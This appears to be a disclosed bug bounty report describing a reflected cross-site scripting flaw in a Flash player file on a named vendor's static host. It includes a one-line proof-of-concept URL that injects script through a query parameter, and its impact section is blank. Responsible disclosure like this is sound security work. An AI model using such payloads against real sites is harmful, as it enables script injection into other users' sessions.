# Reflected XSS on ssl-ccstatic.highwebmedia.com  via player.swf

## Report Details
- **Report ID**: 386340
- **URL**: https://hackerone.com/reports/386340
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-07-24T18:19:44.100Z
- **Disclosed**: 2018-09-19T23:35:21.232Z

## Reporter
- **Username**: nahamsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: chaturbate

## Vulnerability Information
Hey there,

There's a SWF based XSS on ssl-ccstatic.highwebmedia.com. You may want to update/remove the file.


#POC
https://ssl-ccstatic.highwebmedia.com/jwplayer/player.swf?playerready=alert(document.domain)

Thanks,
Ben

## Impact

#

## Attachments
No attachments
